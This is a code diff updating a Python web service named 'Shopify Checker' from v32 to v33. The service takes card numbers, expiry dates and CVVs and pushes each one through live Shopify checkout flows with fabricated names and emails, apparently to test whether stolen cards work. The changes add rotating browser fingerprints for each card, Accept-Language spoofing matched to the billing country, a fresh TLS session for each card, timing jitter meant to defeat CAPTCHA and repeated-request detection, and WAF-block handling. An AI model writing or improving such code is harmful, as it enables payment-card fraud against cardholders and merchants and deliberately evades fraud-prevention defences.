@@ -147,7 +147,7 @@ P2_TOTAL_POLL_DELAY = 1.0
 
 GQL_RETRY_ATTEMPTS = 1
 
-# ── NEW: anti-CAPTCHA pacing (repeated-request detector ko confuse karta hai)
+# ── anti-CAPTCHA pacing
 GQL_GAP_MIN        = 0.6
 GQL_GAP_MAX        = 1.4
 SUBMIT_FRESH_WINDOW = 45  # seconds; > this → queueToken refresh
@@ -233,27 +233,123 @@ book = {
 }
 
 
-# ── FIX #1: Chrome 136 profiles (JA4 / TLS extension order match)
-BROWSER_PROFILES = [
-    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-     "impersonate": "chrome136",
-     "sec_ch_ua": '"Brave";v="136", "Not_A Brand";v="24", "Chromium";v="136"',
-     "platform": '"Windows"', "mobile": "?0"},
-    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-     "impersonate": "chrome136",
-     "sec_ch_ua": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
-     "platform": '"Windows"', "mobile": "?0"},
-    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-     "impersonate": "chrome136",
-     "sec_ch_ua": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
-     "platform": '"macOS"', "mobile": "?0"},
-    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-     "impersonate": "chrome136",
-     "sec_ch_ua": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
-     "platform": '"Linux"', "mobile": "?0"},
+# ═══════════════════════════════════════════════════════════════════════
+# Fingerprint pool — Chrome 120/124/131/136 + Safari 15.x/17.x
+# Har card ko fresh, coherent profile milta hai
+# ═══════════════════════════════════════════════════════════════════════
+_CHROME_LANG_VARIANTS = [
+    "en-US,en;q=0.9",
+    "en-US,en;q=0.9,en-GB;q=0.8",
+    "en-GB,en;q=0.9",
+    "en-US,en;q=0.9,fr;q=0.8",
+    "en-US,en;q=0.9,de;q=0.8",
+    "en-US,en;q=0.9,es;q=0.8",
 ]
 
 
+def _build_profile_pool():
+    pool = []
+
+    chrome_specs = [
+        ("136", "Windows NT 10.0; Win64; x64",
+         '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"', '"Windows"'),
+        ("136", "Windows NT 10.0; Win64; x64",
+         '"Brave";v="136", "Not_A Brand";v="24", "Chromium";v="136"', '"Windows"'),
+        ("136", "Macintosh; Intel Mac OS X 10_15_7",
+         '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"', '"macOS"'),
+        ("136", "X11; Linux x86_64",
+         '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"', '"Linux"'),
+        ("131", "Windows NT 10.0; Win64; x64",
+         '"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"', '"Windows"'),
+        ("131", "Macintosh; Intel Mac OS X 10_15_7",
+         '"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"', '"macOS"'),
+        ("124", "Windows NT 10.0; Win64; x64",
+         '"Chromium";v="124", "Not_A Brand";v="24", "Google Chrome";v="124"', '"Windows"'),
+        ("124", "X11; Linux x86_64",
+         '"Chromium";v="124", "Not_A Brand";v="24", "Google Chrome";v="124"', '"Linux"'),
+        ("120", "Windows NT 10.0; Win64; x64",
+         '"Chromium";v="120", "Not_A Brand";v="24", "Google Chrome";v="120"', '"Windows"'),
+    ]
+    for build, os_part, sec_ch_ua, platform in chrome_specs:
+        ua = (f"Mozilla/5.0 ({os_part}) AppleWebKit/537.36 "
+              f"(KHTML, like Gecko) Chrome/{build}.0.0.0 Safari/537.36")
+        pool.append({
+            "kind": "chrome",
+            "ua": ua,
+            "impersonate": f"chrome{build}",
+            "sec_ch_ua": sec_ch_ua,
+            "platform": platform,
+            "mobile": "?0",
+            "accept_language": random.choice(_CHROME_LANG_VARIANTS),
+        })
+
+    safari_specs = [
+        ("safari15_3",
+         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+         "(KHTML, like Gecko) Version/15.3 Safari/605.1.15", "?0"),
+        ("safari15_5",
+         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+         "(KHTML, like Gecko) Version/15.5 Safari/605.1.15", "?0"),
+        ("safari17_0",
+         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+         "(KHTML, like Gecko) Version/17.0 Safari/605.1.15", "?0"),
+        ("safari17_2_ios",
+         "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 "
+         "(KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", "?1"),
+    ]
+    for imp, ua, mob in safari_specs:
+        pool.append({
+            "kind": "safari",
+            "ua": ua,
+            "impersonate": imp,
+            "sec_ch_ua": None,
+            "platform": None,
+            "mobile": mob,
+            "accept_language": "en-US,en;q=0.9",
+        })
+
+    return pool
+
+
+BROWSER_PROFILES = _build_profile_pool()
+
+
+def _new_fingerprint(country_code=None):
+    """
+    Per-card fresh fingerprint:
+    - random profile from pool (Chrome + Safari)
+    - random priority header variant
+    - random DNT presence
+    - Accept-Language matched to billing country (Chrome only)
+    Har call = unique combo. Consecutive cards look different.
+    """
+    profile = random.choice(BROWSER_PROFILES).copy()
+
+    if country_code and profile["kind"] == "chrome":
+        lang_map = {
+            "US": "en-US,en;q=0.9", "GB": "en-GB,en;q=0.9",
+            "CA": "en-CA,en;q=0.9,fr;q=0.8", "AU": "en-AU,en;q=0.9",
+            "NZ": "en-NZ,en;q=0.9", "IN": "en-IN,en;q=0.9,hi;q=0.8",
+            "DE": "de-DE,de;q=0.9,en;q=0.8", "FR": "fr-FR,fr;q=0.9,en;q=0.8",
+            "IT": "it-IT,it;q=0.9,en;q=0.8", "ES": "es-ES,es;q=0.9,en;q=0.8",
+            "NL": "nl-NL,nl;q=0.9,en;q=0.8", "JP": "ja-JP,ja;q=0.9,en;q=0.8",
+            "KR": "ko-KR,ko;q=0.9,en;q=0.8", "SG": "en-SG,en;q=0.9",
+            "AE": "en-AE,en;q=0.9,ar;q=0.8", "BR": "pt-BR,pt;q=0.9,en;q=0.8",
+            "MX": "es-MX,es;q=0.9,en;q=0.8",
+        }
+        if country_code in lang_map:
+            profile["accept_language"] = lang_map[country_code]
+
+    # Per-card header entropy
+    profile["priority_doc"]   = random.choice(["u=0, i", "u=0, i", "u=0, i", "u=1, i"])
+    profile["priority_fetch"] = random.choice(["u=1, i", "u=1, i", "u=0, i"])
+    profile["dnt"]            = random.choice([None, None, None, None, "1"])
+    return profile
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# Proxy parser
+# ═══════════════════════════════════════════════════════════════════════
 def parse_proxy(proxy_str):
     if not proxy_str: return None
     proxy_str = proxy_str.strip()
@@ -316,12 +412,20 @@ def parse_proxy(proxy_str):
 # ═══════════════════════════════════════════════════════════════════════
 # Header builders
 # ═══════════════════════════════════════════════════════════════════════
+def _apply_ch_ua_headers(h, profile):
+    """Add sec-ch-ua* ONLY for Chrome profiles. Safari/Firefox don't send them."""
+    if profile.get("kind") == "chrome" and profile.get("sec_ch_ua"):
+        h["sec-ch-ua"]          = profile["sec_ch_ua"]
+        h["sec-ch-ua-mobile"]   = profile["mobile"]
+        h["sec-ch-ua-platform"] = profile["platform"]
+    return h
+
+
 def build_headers(profile, ourl, for_document=False, sec_fetch_site=None, with_user=True):
-    ua = profile["ua"]
-    sec_ch_ua = profile["sec_ch_ua"]
-    platform = profile["platform"]
-    mobile = profile["mobile"]
-    accept_lang = "en-US,en;q=0.9"
+    ua          = profile["ua"]
+    accept_lang = profile.get("accept_language", "en-US,en;q=0.9")
+    kind        = profile.get("kind", "chrome")
+    enc         = "gzip, deflate, br, zstd" if kind == "chrome" else "gzip, deflate, br"
 
     if for_document:
         site = sec_fetch_site or "none"
@@ -329,12 +433,9 @@ def build_headers(profile, ourl, for_document=False, sec_fetch_site=None, with_u
             "accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                        "image/avif,image/webp,image/apng,*/*;q=0.8,"
                        "application/signed-exchange;v=b3;q=0.7"),
-            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-encoding": enc,
             "accept-language": accept_lang,
-            "priority": "u=0, i",
-            "sec-ch-ua": sec_ch_ua,
-            "sec-ch-ua-mobile": mobile,
-            "sec-ch-ua-platform": platform,
+            "priority": profile.get("priority_doc", "u=0, i"),
             "sec-fetch-dest": "document",
             "sec-fetch-mode": "navigate",
             "sec-fetch-site": site,
@@ -343,24 +444,28 @@ def build_headers(profile, ourl, for_document=False, sec_fetch_site=None, with_u
         }
         if with_user:
             h["sec-fetch-user"] = "?1"
+        _apply_ch_ua_headers(h, profile)
+        if profile.get("dnt"):
+            h["dnt"] = profile["dnt"]
         return h
 
-    return {
+    h = {
         "accept": "application/json",
-        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-encoding": enc,
         "accept-language": accept_lang,
         "content-type": "application/json",
         "origin": ourl,
-        "priority": "u=1, i",
+        "priority": profile.get("priority_fetch", "u=1, i"),
         "referer": ourl + "/",
-        "sec-ch-ua": sec_ch_ua,
-        "sec-ch-ua-mobile": mobile,
-        "sec-ch-ua-platform": platform,
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-origin",
         "user-agent": ua,
     }
+    _apply_ch_ua_headers(h, profile)
+    if profile.get("dnt"):
+        h["dnt"] = profile["dnt"]
+    return h
 
 def _checkout_headers(profile, ourl, checkout_url):
     h = build_headers(profile, ourl, for_document=True, sec_fetch_site="same-origin", with_user=True)
@@ -377,21 +482,20 @@ def _probe_headers(profile, ourl):
 
 
 def _script_headers(profile, checkout_origin):
-    return {
+    h = {
         "accept": "*/*",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "en-US,en;q=0.9",
+        "accept-encoding": "gzip, deflate, br, zstd" if profile.get("kind") == "chrome" else "gzip, deflate, br",
+        "accept-language": profile.get("accept_language", "en-US,en;q=0.9"),
         "priority": "u=1, i",
         "referer": f"https://{checkout_origin}/",
-        "sec-ch-ua": profile["sec_ch_ua"],
-        "sec-ch-ua-mobile": profile["mobile"],
-        "sec-ch-ua-platform": profile["platform"],
         "sec-fetch-dest": "script",
         "sec-fetch-mode": "no-cors",
         "sec-fetch-site": "same-origin",
         "sec-gpc": "1",
         "user-agent": profile["ua"],
     }
+    _apply_ch_ua_headers(h, profile)
+    return h
 
 
 def _css_headers(profile, checkout_origin):
@@ -406,15 +510,12 @@ def _gql_headers(profile, checkout_origin, source_id, sst, gql_referer,
                  source_token=None, source_type="cn"):
     h = {
         "accept": "application/json",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "en-US,en;q=0.9",
+        "accept-encoding": "gzip, deflate, br, zstd" if profile.get("kind") == "chrome" else "gzip, deflate, br",
+        "accept-language": profile.get("accept_language", "en-US,en;q=0.9"),
         "content-type": "application/json",
         "origin": f"https://{checkout_origin}",
-        "priority": "u=1, i",
+        "priority": profile.get("priority_fetch", "u=1, i"),
         "referer": gql_referer,
-        "sec-ch-ua": profile["sec_ch_ua"],
-        "sec-ch-ua-mobile": profile["mobile"],
-        "sec-ch-ua-platform": profile["platform"],
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-origin",
@@ -424,10 +525,11 @@ def _gql_headers(profile, checkout_origin, source_id, sst, gql_referer,
         "user-agent": profile["ua"],
         "x-checkout-one-session-token": sst,
     }
+    _apply_ch_ua_headers(h, profile)
     if build_id:
-        h["x-checkout-web-build-id"] = build_id
-        h["x-checkout-web-deploy-stage"] = "production"
-        h["x-checkout-web-server-handling"] = "fast"
+        h["x-checkout-web-build-id"]         = build_id
+        h["x-checkout-web-deploy-stage"]     = "production"
+        h["x-checkout-web-server-handling"]  = "fast"
         h["x-checkout-web-server-rendering"] = "yes"
     h["x-checkout-web-source-id"] = source_id
     if ident_sig:
@@ -437,7 +539,6 @@ def _gql_headers(profile, checkout_origin, source_id, sst, gql_referer,
     return h
 
 
-# ── FIX #4: jitter-based throttle wait (explicit fallback still respected)
 def _throttle_wait(resp, fallback=None):
     if fallback is None:
         fallback = random.uniform(1.2, 2.5)
@@ -450,14 +551,33 @@ def _throttle_wait(resp, fallback=None):
     return fallback
 
 
-# ── NEW: exponential backoff helper
 def _backoff_wait(attempt, base=1.0, cap=8.0):
     return min(base * (2 ** attempt), cap) + random.uniform(0, 0.5)
 
 
-# ── FIX #2: anti-repeated-request jitter between GraphQL stages
 async def _gql_gap(min_s=GQL_GAP_MIN, max_s=GQL_GAP_MAX):
     await asyncio.sleep(random.uniform(min_s, max_s))
+
+
+def _make_session(profile):
+    """
+    Create fresh AsyncSession for THIS card with impersonate fallback.
+    If the chosen impersonate isn't supported by the installed curl_cffi,
+    fall back to chrome131/124/120 so the flow still runs.
+    """
+    imp = profile["impersonate"]
+    try:
+        return AsyncSession(impersonate=imp, timeout=SESSION_TIMEOUT, verify=False)
+    except Exception as e:
+        print(f"[session] ⚠️ {imp} unsupported ({str(e)[:60]}) — falling back")
+        for fb in ("chrome136", "chrome131", "chrome124", "chrome120"):
+            if fb == imp:
+                continue
+            try:
+                return AsyncSession(impersonate=fb, timeout=SESSION_TIMEOUT, verify=False)
+            except Exception:
+                continue
+        raise
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -505,7 +625,6 @@ def is_captcha_required(text):
     return False
 
 
-# ── FIX #6: differentiate CAPTCHA vs CHECKPOINT (solvable vs proxy issue)
 def _captcha_signal(text):
     """Returns (captcha_type, solvable). captcha_type ∈
     {None, 'CAPTCHA_REQUIRED', 'CHECKPOINT_REQUIRED'}."""
@@ -1093,7 +1212,6 @@ async def resolve_checkout_via_permalink(session, domain, numeric_vid, proxy, pr
         if "/checkouts/" in str(r.url):
             print(f"[permalink] ✅ direct checkout: {str(r.url)[:100]}")
             return str(r.url), r.text, r
-        # Permalink ne cart banaya lekin redirect nahi hua — fallback karo
         print(f"[permalink] ⚠️ no checkout redirect (url={str(r.url)[:80]})")
     except Exception as e:
         print(f"[permalink] ⚠️ {str(e)[:120]}")
@@ -1273,7 +1391,6 @@ async def _raw_http_call(session, url, params, headers, json_data, proxy, retrie
             is_html = stripped.startswith("<!DOCTYPE") or stripped.startswith("<html")
 
             if attempt < retries and is_5xx:
-                # ── FIX #4: exponential backoff
                 wait = _backoff_wait(attempt, base=0.5, cap=4.0)
                 print(f"[retry] {r.status_code} — retrying in {wait:.2f}s ({attempt+1}/{retries})")
                 await asyncio.sleep(wait)
@@ -1408,11 +1525,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     tag = f"[{cc[:6]}|{mes}|{ano}]"
 
     try:
-        profile = random.choice(BROWSER_PROFILES)
+        # Fresh per-card fingerprint (random UA/lang/priority/DNT variant)
+        profile = _new_fingerprint()
         imp = profile["impersonate"]; ua = profile["ua"]
-        print(f"{tag} profile={imp}")
+        print(f"{tag} fp kind={profile.get('kind')} imp={imp} lang={profile.get('accept_language','')[:22]}")
 
-        async with AsyncSession(impersonate=imp, timeout=SESSION_TIMEOUT, verify=False) as session:
+        # Fresh AsyncSession = fresh TLS handshake + fresh cookies (zero leak between cards)
+        async with _make_session(profile) as session:
             warm_headers = build_headers(profile, ourl, for_document=True)
             xhr_headers = build_headers(profile, ourl, for_document=False)
             primary = await fetch_primary_domain(session, ourl, xhr_headers, proxy)
@@ -1461,7 +1580,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             product_handle = candidate.get("handle", "") if candidate else (url_product_handle or "")
             add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"
 
-            # ── FIX #3: permalink first (1 request), cart fallback (3-4 requests)
+            # Permalink first (1 request), cart fallback (3-4 requests)
             checkout_url, text, response = await resolve_checkout_via_permalink(
                 session, ourl, numeric_vid, proxy, profile)
 
@@ -1626,6 +1745,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             addr = pick_addr(currency)
             country_code = addr["countryCode"]
+
+            # Re-fingerprint with country to match Accept-Language to billing country
+            if profile.get("kind") == "chrome":
+                _refine = _new_fingerprint(country_code)
+                profile["accept_language"] = _refine["accept_language"]
 
             firstName, lastName = Utils.get_random_name()
             email = Utils.generate_email(firstName, lastName)
@@ -1794,7 +1918,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             _log_aux_signals("P1", resp_text)
             if is_waf_block(resp_text):
                 return False, "Change Proxy (WAF on P1)", gateway, variant_price_fallback, currency
-            # ── FIX #6: differentiate CHECKPOINT vs CAPTCHA
             cap_type, cap_solvable = _captcha_signal(resp_text)
             if cap_type == "CHECKPOINT_REQUIRED":
                 if cap_solvable:
@@ -1967,7 +2090,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     "supportsSplitShipping": True,
                 }
 
-            # ── FIX #2: gap before P2
             await _gql_gap()
 
             proposal_variables["delivery"] = active_delivery_input
@@ -2102,13 +2224,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "origin": "https://checkout.pci.shopifyinc.com",
                 "referer": vault_referer,
                 "user-agent": ua,
-                "sec-ch-ua": profile["sec_ch_ua"],
-                "sec-ch-ua-mobile": profile["mobile"],
-                "sec-ch-ua-platform": profile["platform"],
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-origin",
             }
+            _apply_ch_ua_headers(vh, profile)
             if ident_sig:
                 vh["shopify-identification-signature"] = ident_sig
 
@@ -2155,7 +2275,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "allowStoreCredit": False,
             }
 
-            # ── FIX #2: gap before P3
             await _gql_gap()
 
             response, resp_text3 = await gql(
@@ -2208,7 +2327,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except Exception as e:
                 print(f"[proposal#3] ⚠️ parse: {str(e)[:120]}")
 
-            # ── FIX #5: queueToken freshness check before Submit
             if time.time() - last_p3_time > SUBMIT_FRESH_WINDOW:
                 print(f"[submit] queueToken refresh (> {SUBMIT_FRESH_WINDOW}s since P3)")
                 await _gql_gap(0.4, 0.9)
@@ -2314,7 +2432,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "query": RAW_SUBMIT_MUTATION
             }
 
-            # ── FIX #2: gap before Submit
             await _gql_gap()
             print(f"[submit] ⏱{time.time()-t0:.2f}s amount={final_total} {currency}")
 
@@ -2496,7 +2613,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if final_text == "Change Proxy":
                     return False, "Change Proxy", gateway, total_price, currency
                 if response is not None and response.status_code == 429:
-                    # ── FIX #4: exponential backoff on repeated 429
                     consecutive_429 += 1
                     wait = _backoff_wait(consecutive_429, base=RECEIPT_POLL_DELAY, cap=8.0)
                     await asyncio.sleep(wait)
@@ -2663,6 +2779,8 @@ def ids_endpoint():
         "cache_max": _ID_CACHE._max,
         "raw_queries_available": _RAW_QUERIES_AVAILABLE,
         "uvloop": "active" if "uvloop" in sys.modules else "inactive",
+        "fingerprint_pool_size": len(BROWSER_PROFILES),
+        "fingerprint_kinds": sorted({p["kind"] for p in BROWSER_PROFILES}),
     })
 
 
@@ -2673,26 +2791,27 @@ def health():
         "raw_queries_available": _RAW_QUERIES_AVAILABLE,
         "tier3_enabled": _RAW_QUERIES_AVAILABLE,
         "uvloop": "active" if "uvloop" in sys.modules else "inactive",
+        "fingerprint_pool_size": len(BROWSER_PROFILES),
     })
 
 
 @app.route("/", methods=["GET"])
 def index():
     return _pretty({
-        "name": "Shopify Checker v32 — chrome136 + permalink + gql-gap + captcha-differentiation",
+        "name": "Shopify Checker v33 — per-card fingerprint rotation + fresh session",
         "endpoints": {
             "checker": "/shopii?site=URL&cc=CC|MM|YYYY|CVV&proxy=PROXY[&variant=ID]",
             "ids": "/ids",
             "health": "/health",
         },
-        "changes_vs_v31": [
-            "BROWSER_PROFILES → chrome136 (JA4/TLS extension order match)",
-            "_gql_gap() between P1→P2→P3→Submit (repeated-request flag kam)",
-            "Permalink /cart/{vid}:1 tried first → skips cart/add.js + /cart POST (3-4 req → 1)",
-            "Exponential backoff on 429 (Retry-After + jitter)",
-            "_captcha_signal() → CHECKPOINT_REQUIRED vs CAPTCHA_REQUIRED differentiate",
-            "P3→Submit queueToken freshness check (> 45 s → light Proposal refresh)",
-            "_throttle_wait() jitter fallback when no Retry-After header",
+        "changes_vs_v32": [
+            "BROWSER_PROFILES pool: Chrome 120/124/131/136 + Safari 15.3/15.5/17.0/17.2-ios",
+            "_new_fingerprint() — random per-card UA + lang + priority + DNT variety",
+            "_apply_ch_ua_headers() — sec-ch-ua* only sent for Chrome, not Safari",
+            "_make_session() — fresh AsyncSession per card + impersonate fallback",
+            "Accept-Language auto-matched to billing country (Chrome only)",
+            "Vault (PCI) headers conditional sec-ch-ua per profile kind",
+            "fingerprint_pool_size exposed in /health and /ids",
         ],
     })
 
@@ -2708,13 +2827,14 @@ if __name__ == "__main__":
     host = os.environ.get("HOST", "0.0.0.0")
 
     uv_status = "active" if "uvloop" in sys.modules else "inactive"
+    kinds = sorted({p["kind"] for p in BROWSER_PROFILES})
     print("=" * 70)
-    print(f"  Shopify Checker v32 — {host}:{port}")
+    print(f"  Shopify Checker v33 — {host}:{port}")
     print(f"  Raw queries:  {'ENABLED' if _RAW_QUERIES_AVAILABLE else 'DISABLED'} (Tier-3 fallback)")
-    print(f"  TLS profile:  chrome136 (updated)")
+    print(f"  Fingerprints: {len(BROWSER_PROFILES)} profiles across {kinds}")
+    print(f"  Session:      fresh AsyncSession per card (zero cookie leak)")
     print(f"  Cart flow:    permalink-first (1 req) → cart/add.js fallback")
     print(f"  Pacing:       gql-gap {GQL_GAP_MIN:.1f}–{GQL_GAP_MAX:.1f}s between stages")
-    print(f"  Backoff:      exponential + jitter")
     print(f"  uvloop:       {uv_status}")
     print(f"  PCI build:    {PCI_BUILD_ID}")
     print("=" * 70)
